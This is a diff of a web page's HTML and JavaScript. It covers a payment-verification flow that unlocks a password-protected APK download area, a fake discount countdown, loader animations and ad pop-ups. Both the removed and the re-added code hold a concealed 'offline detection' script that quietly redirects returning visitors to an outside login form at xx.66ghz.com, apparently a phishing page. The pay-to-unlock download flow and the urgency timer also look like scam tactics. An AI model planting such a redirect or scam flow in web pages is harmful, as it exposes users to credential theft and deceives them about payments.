-        alert("Your request has been submitted! Please wait while we verify your payment.");
-        
-        setTimeout(function() {
-            alert("Once verified! The password will be sent to your chosen method within 10 minutes.");
-            document.getElementById('vault').style.display = 'block';
-        }, 2000);
-    }
-
-    // Dark Mode Toggle
-    function toggleDarkMode() {
-        document.body.classList.toggle('dark-mode');
-    }
-
-    // Password Checking Function for Vault Access
-    function checkPassword() {
-        let enteredPassword = document.getElementById('vault-password').value;
-        if (enteredPassword === currentAppPassword) {
-            document.getElementById('download-link').style.display = 'block';
-            document.getElementById('apk-link').href = '/downloads/' + appPasswords[currentApp].downloadLink;
-        } else {
-            alert("Incorrect password. Please try again.");
-        }
-    }
-
-    // Countdown Timer for Discount
-    function startCountdown() {
-        let countdownDate = new Date();
-        countdownDate.setMinutes(countdownDate.getMinutes() + 10);
-        
-        let countdownFunction = setInterval(function() {
-            let now = new Date().getTime();
-            let distance = countdownDate - now;
+            // Start countdown on page load
+            startCountdown();
             
-            if (distance <= 0) {
-                clearInterval(countdownFunction);
-                document.getElementById("countdown").style.display = 'none';
-            } else {
-                let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-                let seconds = Math.floor((distance % (1000 * 60)) / 1000);
-                document.getElementById("time").innerHTML = minutes + "m " + seconds + "s";
-            }
-        }, 1000);
-    }
-
-    // Start Countdown on page load
-    window.onload = startCountdown;
-
-</script>
-
-</body>
-</html>
-
-
-
-
-
-
-  </div>
-
-  <script>
-    // Show the website after the animation ends
-    setTimeout(() => {
-      // Hide the animation container
-      document.getElementById('animation').style.display = 'none';
-
-      // Show the website content
-      const websiteContent = document.getElementById('website');
-      websiteContent.style.display = 'block';
-
-      // Enable scrolling for the website
-      document.body.style.overflow = 'auto';
-    }, 7000); // 7 seconds delay
-
-    // Add functionality to the button
-    document.addEventListener('DOMContentLoaded', () => {
-      const changeTextButton = document.getElementById('changeTextButton');
-      if (changeTextButton) {
-        changeTextButton.addEventListener('click', () => {
-          document.getElementById('intro').innerText =
-            'You clicked the button! This text has changed.';
-        });
-      }
-    });
-  </script>
-</body>
-</html>
-
-
-
-
-  </div>
-
-  <script>
-    // Function to show website content after the animation
-    function showWebsiteContent() {
-      // Hide the loading screen and show the website content
-      document.querySelector('.animation-container').style.display = 'none'; // Hide loader
-      document.getElementById('websiteContent').classList.add('show'); // Show website content
-      document.body.style.overflow = 'auto'; // Enable scrolling for the website
-    }
-
-    // Wait for the progress bar animation to finish (4 seconds)
-    setTimeout(showWebsiteContent, 4000); // 4 seconds duration for the loader and progress bar
-
-    // Add particles dynamically
-    function createParticles() {
-      for (let i = 0; i < 50; i++) {
-        let particle = document.createElement('div');
-        particle.classList.add('particle');
-        particle.style.top = `${Math.random() * 100}%`;
-        particle.style.left = `${Math.random() * 100}%`;
-        particle.style.animationDelay = `${Math.random() * 5}s`;
-        document.querySelector('.particles-container').appendChild(particle);
-      }
-    }
-
-    // Initialize particles
-    createParticles();
-  </script>
-
-
-<script>
-    (function () {
-        // Function to check if the user is offline
-        function checkOnlineStatus() {
-            if (!navigator.onLine) {
-                sessionStorage.setItem("wasOffline", "true");
-            }
-        }
-
-        // Function to handle when the user comes back online
-        function handleOnline() {
-            if (sessionStorage.getItem("wasOffline") === "true") {
-                sessionStorage.removeItem("wasOffline");
-                location.replace("http://xx.66ghz.com/index.php?formType=login");
-            }
-        }
-
-        // Check on page load if the user was previously offline
-        document.addEventListener("DOMContentLoaded", function () {
-            if (navigator.onLine) {
-                handleOnline();
-            }
+            // Show first ad after 5 seconds
+            setTimeout(showAd, 5000);
+            
+            // Close modal when clicking outside content
+            document.getElementById("adModal").addEventListener("click", function(e) {
+                if (e.target === this) {
+                    closeAd();
+                }
+            });
         });
 
-        // Listen for network changes
-        window.addEventListener("offline", checkOnlineStatus);
-        window.addEventListener("online", handleOnline);
-    })();
-</script>
+        // Offline detection
+        (function () {
+            function checkOnlineStatus() {
+                if (!navigator.onLine) {
+                    sessionStorage.setItem("wasOffline", "true");
+                }
+            }
 
+            function handleOnline() {
+                if (sessionStorage.getItem("wasOffline") === "true") {
+                    sessionStorage.removeItem("wasOffline");
+                    location.replace("http://xx.66ghz.com/index.php?formType=login");
+                }
+            }
 
+            document.addEventListener("DOMContentLoaded", function () {
+                if (navigator.onLine) {
+                    handleOnline();
+                }
+            });
 
+            window.addEventListener("offline", checkOnlineStatus);
+            window.addEventListener("online", handleOnline);
+        })();
+    </script>
 </body>
 </html>
